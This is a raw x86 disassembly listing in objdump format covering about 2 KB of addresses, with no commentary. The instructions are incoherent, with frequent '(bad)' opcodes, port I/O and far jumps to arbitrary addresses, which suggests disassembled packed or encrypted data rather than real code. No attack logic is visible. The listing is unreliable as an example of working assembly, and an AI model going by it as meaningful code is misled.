  41707e:	mov    WORD PTR [ebx+0x26],ss
  417081:	ret    
  417082:	add    DWORD PTR [ecx-0x586631ae],esp
  417088:	not    DWORD PTR [ebx+0x67]
  41708b:	jb     0x4170eb
  41708d:	mov    ecx,0x104a63b7
  417092:	mov    eax,ds:0x81ec89f5
  417097:	xor    eax,0xee648bd1
  41709c:	xchg   ebx,eax
  41709d:	add    edx,DWORD PTR [esi]
  41709f:	test   DWORD PTR [ecx],esp
  4170a1:	mov    ch,0x4a
  4170a3:	sar    DWORD PTR [ebx-0x17],cl
  4170a6:	es icebp 
  4170a8:	cmc    
  4170a9:	dec    esi
  4170aa:	jecxz  0x4170e2
  4170ac:	ficomp WORD PTR [ecx-0x17]
  4170af:	inc    ebp
  4170b0:	mov    ebx,DWORD PTR [ecx+0x36]
  4170b3:	mov    ah,0xc5
  4170b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170b6:	mov    eax,ds:0x2760f62e
  4170bb:	or     BYTE PTR [edx+0x14],bh
  4170be:	mov    esp,DWORD PTR ss:[esi+0xc24fe65]
  4170c5:	retf   0x812b
  4170c8:	inc    ebx
  4170c9:	stos   DWORD PTR es:[edi],eax
  4170ca:	dec    edi
  4170cb:	scas   eax,DWORD PTR es:[edi]
  4170cc:	inc    ebp
  4170cd:	stos   DWORD PTR es:[edi],eax
  4170ce:	shl    DWORD PTR [ecx],1
  4170d0:	jmp    0xb9833ee1
  4170d5:	fisttp WORD PTR ds:0x5e0fe499
  4170db:	shl    BYTE PTR [ecx],1
  4170dd:	(bad)  
  4170de:	xor    dl,ch
  4170e0:	pop    es
  4170e1:	in     al,dx
  4170e2:	iret   
  4170e3:	mov    BYTE PTR [eax+0x19504af0],0x7d
  4170ea:	push   ebp
  4170eb:	jmp    0x42ab5809
  4170f0:	xor    esi,DWORD PTR [ebx]
  4170f2:	mov    esi,0x10c12f9c
  4170f7:	ins    DWORD PTR es:[edi],dx
  4170f8:	mov    eax,0xe84f39d7
  4170fd:	cmp    eax,0x2958d38a
  417102:	jbe    0x4170de
  417104:	mov    edi,0x91e4f0ce
  417109:	and    BYTE PTR [ecx],0xe8
  41710c:	mov    bh,0x8d
  41710e:	ret    0xb356
  417111:	dec    ebp
  417112:	(bad)  
  417113:	sub    esi,DWORD PTR [edx+ecx*2-0x719152a7]
  41711a:	xchg   ecx,eax
  41711b:	loope  0x4170fb
  41711d:	out    0xf9,al
  41711f:	call   0xab40503c
  417124:	mov    al,0x0
  417126:	sar    BYTE PTR [esi-0x31],1
  417129:	retf   0x51b1
  41712c:	sti    
  41712d:	pslld  mm2,QWORD PTR [esi+0x6c]
  417131:	ror    DWORD PTR [ebp-0x27d0afee],1
  417137:	in     al,dx
  417138:	mov    esi,0xa9da6c79
  41713d:	adc    DWORD PTR [esi],eax
  41713f:	fwait
  417140:	ss je  0x417125
  417143:	repz scas eax,DWORD PTR es:[edi]
  417145:	inc    ecx
  417146:	pop    es
  417147:	mov    BYTE PTR [edx],ch
  417149:	retf   0xa4ed
  41714c:	mov    ds:0xda8a9d04,eax
  417151:	xchg   BYTE PTR [eax],ch
  417153:	xchg   ebp,eax
  417154:	pop    esi
  417155:	cdq    
  417156:	retf   0x4ffb
  417159:	jne    0x417178
  41715b:	sbb    al,0x4b
  41715d:	inc    ebx
  41715e:	fnstenv [esi+0x5af8f655]
  417164:	dec    eax
  417165:	add    al,0xec
  417167:	xchg   esp,eax
  417168:	sub    al,0xc3
  41716a:	aam    0x2d
  41716c:	test   ebx,0xac92119c
  417172:	inc    eax
  417173:	and    edi,esi
  417175:	enter  0x926e,0x49
  417179:	mov    edx,0x91bdaeec
  41717e:	jmp    0xb24e:0xc9ef84d5
  417185:	jmp    0xafe61255
  41718a:	adc    ch,BYTE PTR [ebp+0x1f]
  41718d:	fimul  WORD PTR [ebp-0x5e8bf02e]
  417193:	sub    al,0x39
  417195:	jno    0x41715e
  417197:	fadd   DWORD PTR [edi+0x114872c8]
  41719d:	out    dx,eax
  41719e:	push   0xd1fedf8
  4171a3:	xor    ebp,DWORD PTR [ecx+ecx*1]
  4171a6:	adc    al,0x53
  4171a8:	add    DWORD PTR [esi+0x28e69ee6],esi
  4171ae:	or     dh,BYTE PTR [ebp+0xef45d16]
  4171b4:	mov    cl,0xbf
  4171b6:	hlt    
  4171b7:	call   0x2e8cbeb6
  4171bc:	xchg   esp,eax
  4171bd:	pop    ebx
  4171be:	add    DWORD PTR [ebx],ecx
  4171c0:	sbb    BYTE PTR [edi+0x58],0xcd
  4171c4:	dec    eax
  4171c5:	push   edx
  4171c6:	xor    eax,0x935e6734
  4171cb:	mov    ah,0x23
  4171cd:	sub    ch,al
  4171cf:	jmp    ebp
  4171d1:	in     eax,dx
  4171d2:	jae    0x4171dc
  4171d4:	mov    bl,0xa3
  4171d6:	or     bl,BYTE PTR [eax-0x25917d28]
  4171dc:	cmc    
  4171dd:	loope  0x417170
  4171df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e0:	mov    ebp,0x246ee16f
  4171e5:	mov    ds:0x85de79be,al
  4171ea:	mov    eax,DWORD PTR [edx]
  4171ec:	arpl   WORD PTR [ebx+0x789af926],si
  4171f2:	std    
  4171f3:	shr    BYTE PTR [eax+0x2b],0xfc
  4171f7:	dec    esi
  4171f8:	call   0xde323248
  4171fd:	jmp    0xbc24:0x4ac1929f
  417204:	test   al,0x9f
  417206:	out    dx,eax
  417207:	out    dx,eax
  417208:	retf   
  417209:	test   BYTE PTR [ebx-0x72ed7c57],ah
  41720f:	mov    ch,0x9d
  417211:	jnp    0x417237
  417213:	data16 jno 0x4171be
  417216:	pop    eax
  417217:	jmp    0xc1508314
  41721c:	mov    bl,0xa6
  41721e:	mov    ebx,0xe7965fcb
  417223:	(bad)  
  417224:	push   esi
  417225:	pop    esi
  417226:	fs mov cl,cl
  417229:	sub    ecx,edi
  41722b:	jnp    0x4171ea
  41722d:	pop    ecx
  41722e:	lea    ecx,[ebx]
  417230:	dec    edx
  417231:	lahf   
  417232:	lds    ebx,FWORD PTR [edx+0x5]
  417235:	xchg   ecx,eax
  417236:	enter  0xbf02,0x36
  41723a:	iret   
  41723b:	push   ss
  41723c:	test   al,0x68
  41723e:	and    DWORD PTR [esp+edi*2-0x480de0bf],ecx
  417245:	addr16 dec edi
  417247:	or     eax,0x3c3f5213
  41724c:	dec    ebp
  41724d:	test   DWORD PTR [ecx],esp
  41724f:	push   ecx
  417250:	outs   dx,DWORD PTR fs:[esi]
  417252:	fnstcw WORD PTR [ebp+0x2e5456dd]
  417258:	out    dx,eax
  417259:	cmp    ecx,0xffffffbe
  41725c:	sub    al,0x1f
  41725e:	dec    eax
  41725f:	push   esp
  417260:	loope  0x41721b
  417262:	or     al,0xec
  417264:	cmp    BYTE PTR ds:0xfc2bc7a2,al
  41726a:	ret    0x18bc
  41726d:	sbb    BYTE PTR [ecx],al
  41726f:	ins    DWORD PTR es:[edi],dx
  417270:	fistp  WORD PTR [eax+edx*4]
  417273:	dec    esp
  417274:	ja     0x417226
  417276:	enter  0xd029,0xb8
  41727a:	and    BYTE PTR [eax],cl
  41727c:	mov    ds,WORD PTR [edi+0x1491e963]
  417282:	je     0x4172eb
  417284:	fxch   st(1)
  417286:	ss or  al,0x5c
  417289:	pop    ds
  41728a:	pop    edx
  41728b:	rcl    BYTE PTR [ecx-0x402b73a7],cl
  417291:	dec    ebx
  417292:	lock pop ecx
  417294:	lahf   
  417295:	jmp    0x417299
  417297:	frstor [ecx-0x225625d]
  41729d:	mov    al,0xdd
  41729f:	and    bl,BYTE PTR [edx+0x1f]
  4172a2:	xchg   esp,eax
  4172a3:	lahf   
  4172a4:	push   edi
  4172a5:	loopne 0x417268
  4172a7:	bound  ebp,QWORD PTR [eax]
  4172a9:	jmp    0x6ce19084
  4172ae:	mov    edi,ebp
  4172b0:	add    eax,0x2aee7e14
  4172b5:	sub    al,0xd2
  4172b7:	sbb    al,0x24
  4172b9:	push   ecx
  4172ba:	sbb    al,0xaa
  4172bc:	jb     0x417282
  4172be:	cmp    eax,0x494db4ce
  4172c3:	push   eax
  4172c4:	call   0xa9343045
  4172c9:	and    ebp,DWORD PTR [eax+0x6a]
  4172cc:	aas    
  4172cd:	js     0x4172f7
  4172cf:	clc    
  4172d0:	mov    ecx,0x17c77e5b
  4172d5:	sti    
  4172d6:	fld    QWORD PTR [eax-0x2a]
  4172d9:	inc    eax
  4172da:	mov    esi,0x275a1c90
  4172df:	inc    ecx
  4172e0:	ss mov ebp,edi
  4172e3:	mov    esi,0x27b35c66
  4172e8:	pushf  
  4172e9:	pop    esp
  4172ea:	cmp    DWORD PTR [ecx],eax
  4172ec:	retf   
  4172ed:	jecxz  0x4172ed
  4172ef:	jmp    0xca7:0xf8445ae0
  4172f6:	mov    edx,0x2f177d7e
  4172fb:	push   esi
  4172fc:	push   eax
  4172fd:	fsubr  QWORD PTR [ebx+0x16]
  417300:	jno    0x417302
  417302:	rol    BYTE PTR [ecx-0x7d2f1fbd],cl
  417308:	fsubr  DWORD PTR [edi+0xb]
  41730b:	xchg   esi,eax
  41730c:	iret   
  41730d:	(bad)  
  41730e:	sti    
  41730f:	out    dx,eax
  417310:	div    DWORD PTR [ebx+eiz*8+0x3638a1e9]
  417317:	cmp    BYTE PTR [esi],cl
  417319:	pusha  
  41731a:	push   ss
  41731b:	hlt    
  41731c:	sub    BYTE PTR [ebp-0x267de38d],ch
  417322:	cmp    BYTE PTR [edx-0x3009ec48],0x1d
  417329:	inc    eax
  41732a:	and    DWORD PTR [esi-0x5d6f348f],edi
  417330:	aaa    
  417331:	sub    DWORD PTR [eax],eax
  417333:	outs   dx,DWORD PTR ds:[esi]
  417334:	and    DWORD PTR [ebx-0xa],ecx
  417337:	mov    ?,WORD PTR [esi+0xb]
  41733a:	in     eax,0x3b
  41733c:	enter  0x993e,0x76
  417340:	mov    esi,0x3662a67a
  417345:	jmp    0xa51b86c6
  41734a:	dec    esp
  41734b:	ss jmp 0x417384
  41734e:	fdivr  st(4),st
  417350:	pop    ebx
  417351:	ror    cl,0x47
  417354:	xor    eax,0xb84131e4
  417359:	nop
  41735a:	xor    esi,DWORD PTR [ebx]
  41735c:	mov    ds:0x7f38b1d,al
  417361:	mov    eax,ds:0xceeb4ac2
  417366:	addr16 jno 0x41730e
  417369:	int    0x68
  41736b:	push   edx
  41736c:	and    ecx,DWORD PTR [edi+0x31]
  41736f:	or     ch,BYTE PTR [eax]
  417371:	adc    al,0x25
  417373:	add    al,0x9e
  417375:	xor    bh,ah
  417377:	mov    cl,0xcb
  417379:	or     BYTE PTR [eax+0x7612e229],bh
  41737f:	dec    ecx
  417380:	jbe    0x4173c3
  417382:	inc    ecx
  417383:	and    ecx,edi
  417385:	jnp    0x41739f
  417387:	jecxz  0x4173ca
  417389:	adc    BYTE PTR es:[ecx+ebp*1-0x4bf6cfb8],bh
  417391:	jnp    0x41735d
  417393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417394:	push   ebp
  417395:	xchg   ebx,eax
  417396:	imul   eax,DWORD PTR [ecx-0x80],0x2
  41739a:	and    cl,bl
  41739c:	ret    0x5274
  41739f:	adc    DWORD PTR [edx],ebp
  4173a1:	xor    eax,0x9bd1b76e
  4173a6:	fcmovnb st,st(1)
  4173a8:	xchg   edi,eax
  4173a9:	outs   dx,BYTE PTR ds:[esi]
  4173aa:	cmp    DWORD PTR [ecx+0x45e3e25d],edi
  4173b0:	mov    ds:0xaf21867f,al
  4173b5:	nop
  4173b6:	and    al,0x2f
  4173b8:	push   ds
  4173b9:	das    
  4173ba:	aaa    
  4173bb:	stos   DWORD PTR es:[edi],eax
  4173bc:	and    bl,BYTE PTR [edi]
  4173be:	ds and ebx,ebp
  4173c1:	test   DWORD PTR [ebx],esi
  4173c3:	adc    DWORD PTR [esi+0x5a6a1cd],esp
  4173c9:	mov    cl,0x7e
  4173cb:	out    0x54,eax
  4173cd:	mov    esp,0xc9e097f
  4173d2:	push   ebx
  4173d3:	inc    ebx
  4173d4:	pop    es
  4173d5:	or     eax,0x6679e647
  4173da:	aas    
  4173db:	jle    0x4173cc
  4173dd:	inc    esp
  4173de:	pusha  
  4173df:	loope  0x417370
  4173e1:	jge    0x41741c
  4173e3:	sbb    eax,0x288c2f4f
  4173e8:	nop
  4173e9:	dec    esp
  4173ea:	stos   DWORD PTR es:[edi],eax
  4173eb:	pop    esp
  4173ec:	inc    edx
  4173ed:	div    BYTE PTR es:[ebp+0x258aee07]
  4173f4:	aam    0x9c
  4173f6:	out    dx,al
  4173f7:	push   0x7a
  4173f9:	dec    ecx
  4173fa:	imul   esi,ebx,0xfffffff3
  4173fd:	and    al,0x24
  4173ff:	cmp    DWORD PTR [ecx+0x76],ecx
  417402:	inc    ebp
  417403:	icebp  
  417404:	push   esi
  417405:	xor    DWORD PTR [ebx+0xe],0xd
  417409:	xor    ah,BYTE PTR [eax-0x4ae69c85]
  41740f:	daa    
  417410:	and    bl,BYTE PTR [edx+0x36]
  417413:	lock mov DWORD PTR [ebx+0x5047ab17],esi
  41741a:	sahf   
  41741b:	lock jno 0x4173e1
  41741e:	push   edi
  41741f:	aad    0x16
  417421:	call   0x41b82f90
  417426:	or     BYTE PTR [ebp+ebp*2+0x1e],bl
  41742a:	jecxz  0x417447
  41742c:	mov    ds:0xdbebfa46,eax
  417431:	and    eax,0x4701245c
  417436:	cdq    
  417437:	xor    eax,0x7198a986
  41743c:	adc    ecx,edx
  41743e:	les    ebx,FWORD PTR [edx-0x42]
  417441:	add    al,0xb3
  417443:	frndint 
  417445:	hlt    
  417446:	into   
  417447:	mov    ebx,0x4fcc1a4f
  41744c:	(bad)  
  41744d:	clc    
  41744e:	punpckhwd mm1,mm0
  417451:	sub    DWORD PTR [eiz*8-0x46b3b5e0],edx
  417458:	sbb    ebx,eax
  41745a:	or     al,0xa5
  41745c:	jle    0x417421
  41745e:	lahf   
  41745f:	pop    es
  417460:	div    BYTE PTR [ebx-0x630a4bc]
  417466:	or     al,BYTE PTR [esi+0x60f7edd2]
  41746c:	lahf   
  41746d:	dec    esi
  41746e:	imul   esi,DWORD PTR [esi],0x4b50613
  417474:	call   0xf63a:0x1ee3ca5f
  41747b:	call   0xd850:0xad1ab85
  417482:	gs pop esp
  417484:	fcomp  DWORD PTR [ebp+0x45]
  417487:	sub    BYTE PTR [esi-0x57bbf9c2],bl
  41748d:	add    BYTE PTR [eax],al
  41748f:	add    BYTE PTR [eax],al
  417491:	add    bh,bl
  417493:	dec    ebp
  417494:	call   0x305f:0xdfdf9a89
  41749b:	adc    al,0x61
  41749d:	retf   0xfe50
  4174a0:	lahf   
  4174a1:	cmp    eax,0xf22b
  4174a6:	repz add al,0x0
  4174a9:	add    BYTE PTR [edi+0x71],bh
  4174ac:	and    DWORD PTR [ebp-0x15],edi
  4174af:	mov    ds:0xe21577ec,al
  4174b4:	xor    DWORD PTR [eax],esp
  4174b6:	adc    eax,0x957072bc
  4174bb:	aas    
  4174bc:	int    0x34
  4174be:	jg     0x41751d
  4174c0:	jmp    0x417530
  4174c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174c3:	or     eax,0x4da36b05
  4174c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174c9:	xchg   edi,eax
  4174ca:	out    dx,eax
  4174cb:	jnp    0x417481
  4174cd:	loop   0x417507
  4174cf:	and    esi,DWORD PTR [edi+0x5c]
  4174d2:	repnz mov eax,0xfd69fae4
  4174d8:	jmp    0x4174f9
  4174da:	jmp    0xa5848e8f
  4174df:	inc    ebx
  4174e0:	lods   al,BYTE PTR ds:[esi]
  4174e1:	dec    eax
  4174e2:	inc    edi
  4174e3:	dec    esp
  4174e4:	sub    DWORD PTR [ebx],ebp
  4174e6:	shl    DWORD PTR ds:0x826ffcc6,cl
  4174ec:	repz pop edx
  4174ee:	out    0x8a,eax
  4174f0:	aas    
  4174f1:	dec    esi
  4174f2:	in     eax,dx
  4174f3:	mov    al,0xcd
  4174f5:	retf   
  4174f6:	push   edi
  4174f7:	lods   al,BYTE PTR ds:[esi]
  4174f8:	add    BYTE PTR [edx],ch
  4174fa:	or     eax,0x512c335c
  4174ff:	xor    al,0x79
  417501:	fstp   st(0)
  417503:	pop    ds
  417504:	and    eax,0x2178a90f
  417509:	jmp    0x1932e643
  41750e:	inc    eax
  41750f:	cmp    bl,BYTE PTR [esi]
  417511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417512:	into   
  417513:	pop    ebx
  417514:	push   edi
  417515:	push   esp
  417516:	sbb    DWORD PTR [eax-0x4dc31cd7],0xffffff84
  41751d:	cmc    
  41751e:	add    edx,edx
  417520:	xchg   DWORD PTR [eax+0x6393846c],esi
  417526:	pop    ds
  417527:	lods   al,BYTE PTR ds:[esi]
  417528:	dec    edi
  417529:	or     bl,BYTE PTR [edx-0x2c2501f4]
  41752f:	lea    esi,[ebp-0x5e2cab2d]
  417535:	dec    esp
  417536:	jno    0x417531
  417538:	sbb    eax,0xacf36571
  41753d:	mov    ebx,0xdb3eb7e8
  417542:	xchg   BYTE PTR [edi],dl
  417544:	cmc    
  417545:	sti    
  417546:	inc    ebx
  417547:	jns    0x41758b
  417549:	in     eax,dx
  41754a:	pushf  
  41754b:	ins    DWORD PTR es:[edi],dx
  41754c:	(bad)  
  41754d:	sti    
  41754e:	dec    esi
  41754f:	sbb    edx,DWORD PTR [eax]
  417551:	fdivrp st(4),st
  417553:	out    0x67,al
  417555:	mov    ebp,0x52bb0795
  41755a:	jge    0x417561
  41755c:	jne    0x4175d7
  41755e:	sub    ah,al
  417560:	sbb    edx,DWORD PTR [eax+edi*8]
  417563:	hlt    
  417564:	jnp    0x4175cb
  417566:	repnz and al,0x1b
  417569:	add    esp,ebx
  41756b:	aas    
  41756c:	test   al,0x14
  41756e:	shl    eax,cl
  417570:	nop
  417571:	shl    DWORD PTR [eax-0x32],1
  417574:	jle    0x41758c
  417576:	aaa    
  417577:	inc    eax
  417578:	into   
  417579:	dec    esp
  41757a:	push   edx
  41757b:	mov    dl,BYTE PTR [ebp+0x34119ddc]
  417581:	xor    BYTE PTR [ebx-0x7ee62790],bh
  417587:	mov    cl,0xa
  417589:	int3   
  41758a:	adc    BYTE PTR [esi+0x306874f0],bh
  417590:	retf   0x9dc8
  417593:	mov    ecx,0x9d148846
  417598:	and    edi,DWORD PTR [ecx]
  41759a:	mov    ds:0xa4bd4513,eax
  41759f:	test   eax,0xaff8ace1
  4175a4:	lods   eax,DWORD PTR ds:[esi]
  4175a5:	xchg   BYTE PTR [edx],al
  4175a7:	sbb    ch,BYTE PTR [ebp-0x3f7ead1d]
  4175ad:	int3   
  4175ae:	shl    DWORD PTR [eax+0x54],1
  4175b1:	sub    ebp,DWORD PTR [esi+ebx*4-0x286de781]
  4175b8:	xor    al,0x38
  4175ba:	lock fdivr st,st(2)
  4175bd:	mov    ds:0xb0ab34db,al
  4175c2:	sahf   
  4175c3:	mov    edi,0x2e79f681
  4175c8:	cwde   
  4175c9:	fstp   TBYTE PTR [ebx]
  4175cb:	in     al,dx
  4175cc:	mov    dl,0x9d
  4175ce:	cs lahf 
  4175d0:	cld    
  4175d1:	(bad)  
  4175d3:	mov    bl,0x5c
  4175d5:	pop    es
  4175d6:	xchg   esp,eax
  4175d7:	ret    0x5065
  4175da:	mov    al,0x2c
  4175dc:	out    0xfd,eax
  4175de:	push   edi
  4175df:	imul   esp,DWORD PTR [ebp+0x4c3fcae3],0x6
  4175e6:	dec    eax
  4175e7:	fild   DWORD PTR [ebp-0x4ded1896]
  4175ed:	dec    esp
  4175ee:	pop    esp
  4175ef:	cld    
  4175f0:	jbe    0x417620
  4175f2:	xchg   esi,eax
  4175f3:	mov    esp,0x22a215c3
  4175f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175f9:	pop    edi
  4175fa:	or     DWORD PTR [edi],esi
  4175fc:	ds sbb eax,0x8caf8841
  417602:	pop    edi
  417603:	pusha  
  417604:	dec    edx
  417605:	mov    esp,0x850d8ea3
  41760a:	(bad)  
  41760c:	outs   dx,DWORD PTR ds:[esi]
  41760d:	mov    ebp,?
  41760f:	adc    BYTE PTR [ebx],ah
  417611:	in     eax,dx
  417612:	mov    ecx,0x6fa047a2
  417617:	dec    esp
  417618:	imul   ebp,DWORD PTR [ebp-0x5439e97f],0xc82d1add
  417622:	outs   dx,BYTE PTR ds:[esi]
  417623:	rcr    BYTE PTR [ebp+eiz*4-0x4b],cl
  417627:	pop    edx
  417628:	mov    ecx,0x37663588
  41762d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41762e:	dec    eax
  41762f:	(bad)  [esi+esi*2-0x30]
  417633:	jecxz  0x417651
  417635:	cmp    al,0xd3
  417637:	or     DWORD PTR [eax-0x21],edx
  41763a:	add    eax,0xa21d732f
  41763f:	leave  
  417640:	mov    dl,0xda
  417642:	cmpxchg DWORD PTR [ebx+0x6f],eax
  417646:	fldenv [ecx+0x64]
  417649:	pop    ss
  41764a:	das    
  41764b:	adc    ebp,DWORD PTR [ecx+ebx*2-0x4cae46a1]
  417652:	push   0x1744da2b
  417657:	push   edx
  417658:	mov    al,ds:0x9a1018b5
  41765d:	pop    ebx
  41765e:	add    al,0xac
  417660:	push   ebx
  417661:	mov    edi,0xbb5132c3
  417666:	adc    ch,dh
  417668:	stos   DWORD PTR es:[edi],eax
  417669:	repnz ds dec ecx
  41766c:	pushf  
  41766d:	icebp  
  41766e:	mov    eax,0x399dce70
  417673:	push   eax
  417674:	into   
  417675:	ret    
  417676:	loope  0x4176a3
  417678:	std    
  417679:	fwait
  41767a:	xchg   ebp,eax
  41767b:	mov    edx,0xfb787e2f
  417680:	fistp  QWORD PTR [eax+0x41]
  417683:	clc    
  417684:	int3   
  417685:	sbb    eax,0x4e41abed
  41768a:	xor    esp,DWORD PTR [esi+0x4adf02e3]
  417690:	dec    ecx
  417691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417692:	jmp    0xf0ac:0x35335a34
  417699:	cwde   
  41769a:	loop   0x4176d1
  41769c:	jmp    0x4b47:0xc030d653
  4176a3:	ins    BYTE PTR es:[edi],dx
  4176a4:	(bad)  
  4176a5:	fwait
  4176a6:	out    0x39,eax
  4176a8:	mov    bh,0x74
  4176aa:	push   eax
  4176ab:	out    0xb3,eax
  4176ad:	xor    cl,BYTE PTR [ecx-0x57]
  4176b0:	sbb    esi,DWORD PTR [edx]
  4176b2:	xchg   edi,eax
  4176b3:	inc    edi
  4176b4:	xchg   BYTE PTR [edx-0x49],bl
  4176b7:	ja     0x41768a
  4176b9:	outs   dx,DWORD PTR ds:[esi]
  4176ba:	dec    eax
  4176bb:	aaa    
  4176bc:	xor    bh,BYTE PTR [edx-0x2af109e1]
  4176c2:	test   al,0xf3
  4176c4:	inc    eax
  4176c5:	sbb    al,dh
  4176c7:	add    DWORD PTR [ecx+0x77130b73],edi
  4176cd:	and    al,0xe7
  4176cf:	xor    eax,0xe78538e2
  4176d4:	sub    cl,BYTE PTR [ecx+ebx*4+0x59993100]
  4176db:	jnp    0x417709
  4176dd:	(bad)  
  4176de:	xchg   ecx,eax
  4176df:	sar    DWORD PTR [edi-0x2],0xc9
  4176e3:	fadd   DWORD PTR ds:0xac7c71d0
  4176e9:	sub    esi,edi
  4176eb:	ret    
  4176ec:	adc    al,0x25
  4176ee:	lahf   
  4176ef:	(bad)  
  4176f0:	je     0x4176ec
  4176f2:	or     bl,BYTE PTR [ecx]
  4176f4:	(bad)  [edx-0x2e]
  4176f7:	jl     0x417746
  4176f9:	in     al,dx
  4176fa:	lods   eax,DWORD PTR ds:[esi]
  4176fb:	dec    ebx
  4176fc:	push   0xe2081023
  417701:	pop    eax
  417702:	(bad)  
  417703:	push   0x37422347
  417708:	lock dec ebx
  41770a:	sub    edx,DWORD PTR [ebx]
  41770c:	add    ah,BYTE PTR [ebx-0x4b]
  41770f:	aam    0x42
  417711:	jo     0x4176d6
  417713:	inc    esi
  417714:	sub    al,0xd3
  417716:	imul   edi,DWORD PTR [ecx-0x18],0x53abc7ad
  41771d:	fcmovnbe st,st(2)
  41771f:	xchg   ecx,eax
  417720:	cmc    
  417721:	add    eax,DWORD PTR [eax-0x61163b3a]
  417727:	sub    ebx,DWORD PTR [esi]
  417729:	jbe    0x4176af
  41772b:	test   BYTE PTR [edi+0xadf0843],ah
  417731:	addr16 test al,0x6
  417734:	repnz cli 
  417736:	ss (bad) 
  417738:	and    eax,0xbb50073
  41773d:	adc    ah,al
  41773f:	(bad)  
  417740:	fld    TBYTE PTR [edi]
  417742:	rcr    BYTE PTR ds:0xe5b75cd8,1
  417748:	and    edx,esp
  41774a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41774b:	pusha  
  41774c:	inc    esp
  41774d:	mov    ch,cl
  41774f:	pop    ebp
  417750:	pop    esp
  417751:	arpl   ax,cx
  417753:	mov    DWORD PTR [eax-0x5620a3ce],ebx
  417759:	xchg   edi,eax
  41775a:	inc    edi
  41775b:	(bad)  
  41775c:	jae    0x417793
  41775e:	xor    edx,DWORD PTR [esi+0xf5cfb44]
  417764:	push   ecx
  417765:	push   es
  417766:	cs mov ecx,ss
  417769:	lods   al,BYTE PTR ds:[esi]
  41776a:	xor    eax,0xf22de530
  41776f:	mov    WORD PTR [edx+ecx*8-0x11],ss
  417773:	jbe    0x4177bf
  417775:	push   ebx
  417776:	dec    edx
  417777:	cmp    BYTE PTR [ebx-0x444de387],dl
  41777d:	dec    ebx
  41777e:	ret    
  41777f:	adc    BYTE PTR [esi],al
  417781:	xor    eax,0xf0d57e01
  417786:	in     al,dx
  417787:	xchg   esi,eax
  417788:	outs   dx,BYTE PTR ds:[esi]
  417789:	push   cs
  41778a:	mov    dh,0xbc
  41778c:	mov    ds:0x333e4edf,al
  417791:	in     al,0xad
  417793:	in     eax,dx
  417794:	shl    DWORD PTR ds:0xbac26a0b,cl
  41779a:	js     0x417800
  41779c:	adc    DWORD PTR [esi+ebp*1],0x59536f16
  4177a3:	dec    ebx
  4177a4:	in     al,dx
  4177a5:	icebp  
  4177a6:	aam    0x0
  4177a8:	sbb    al,0x37
  4177aa:	pop    esi
  4177ab:	enter  0x76d1,0x7d
  4177af:	add    eax,0x461687a4
  4177b4:	push   es
  4177b5:	xor    al,0x1b
  4177b7:	mov    ds:0xe9ce3de9,eax
  4177bc:	in     eax,0x2a
  4177be:	test   eax,0x4c692f21
  4177c3:	imul   ebp,DWORD PTR [ebx-0x49],0xce8bc6d5
  4177ca:	add    ah,BYTE PTR [ecx-0x23bf29fc]
  4177d0:	sub    BYTE PTR [esi+eax*4+0x5158c0d6],0x40
  4177d8:	push   esi
  4177d9:	adc    eax,DWORD PTR [ebp+0x4a059770]
  4177df:	pop    es
  4177e0:	jnp    0x4177d0
  4177e2:	cmp    al,0x2e
  4177e4:	mov    dh,0xca
  4177e6:	sbb    al,0x1d
  4177e8:	jge    0x41780a
  4177ea:	mov    cl,0xb
  4177ec:	(bad)  
  4177ee:	aam    0x27
  4177f0:	out    dx,eax
  4177f1:	xor    DWORD PTR [esi],esi
  4177f3:	jmp    0x417832
  4177f5:	ss sub esi,ecx
  4177f8:	imul   ebx,DWORD PTR [edx+0x2837c214],0x4
  4177ff:	retf   0x1d5a
  417802:	push   ss
  417803:	mov    eax,ds:0x25bd385b
  417808:	outs   dx,BYTE PTR ds:[esi]
  417809:	rcl    BYTE PTR [ebp+0x26],0xed
  41780d:	test   DWORD PTR [eax],0x9a01fa80
  417813:	xchg   ebx,eax
  417814:	fcmovne st,st(5)
  417816:	jns    0x417862
  417818:	ret    
  417819:	or     eax,0x4f9b953
  41781e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41781f:	std    
  417820:	add    ebp,DWORD PTR [esi+0x36abe8e5]
  417826:	xor    esp,DWORD PTR [edi]
  417828:	aaa    
  417829:	daa    
  41782a:	(bad)  
  41782d:	sub    ebp,DWORD PTR ds:0x1dd4068f
  417833:	sahf   
  417834:	jmp    0xc86c3e8c
  417839:	jg     0x4177e3
  41783b:	shl    BYTE PTR [edi],0x4
  41783e:	loopne 0x417850
  417840:	cmp    al,0x1
  417842:	out    dx,al
  417843:	fistp  QWORD PTR [eax+edx*1-0x42]
  417847:	dec    esp
  417848:	sahf   
  417849:	out    dx,al
  41784a:	dec    eax
  41784b:	fcom   DWORD PTR [edi-0x68d04a04]
  417851:	into   
  417852:	dec    edx
  417853:	jmp    0xa6dd:0x29b58ff5
  41785a:	clc    
  41785b:	ficomp DWORD PTR [esi+edx*2-0x79]
  41785f:	jns    0x417871
  417861:	inc    esp
  417862:	adc    al,0x40
  417864:	out    dx,eax
  417865:	xor    edi,ebp
  417867:	pop    ss
  417868:	inc    edi
  417869:	sub    DWORD PTR es:[ecx+0x619b29d0],ebp
  417870:	call   0xbfd6:0xcc442437
  417877:	and    BYTE PTR [ebp+ebx*1+0x35],cl
  41787b:	push   ss
  41787c:	push   esp
  41787d:	cmp    ecx,0x1a
  417880:	sub    dl,ch
  417882:	jle    0x417831
  417884:	lods   al,BYTE PTR ds:[esi]
  417885:	mov    eax,0x1bbfdf5d
  41788a:	nop
  41788b:	loop   0x4178ed
  41788d:	fidiv  DWORD PTR [esi+0x7d]
  417890:	ds pop ecx
  417892:	push   ss
  417893:	cs xchg esi,eax
  417895:	dec    ecx
  417896:	xchg   ebx,eax
  417897:	data16 sahf 
  417899:	fs mov esp,0x9bb4d80f
  41789f:	inc    esi
  4178a0:	push   esp
  4178a1:	adc    DWORD PTR [edx],esi
  4178a3:	push   esi
  4178a4:	pop    ebp
  4178a5:	add    ch,bl
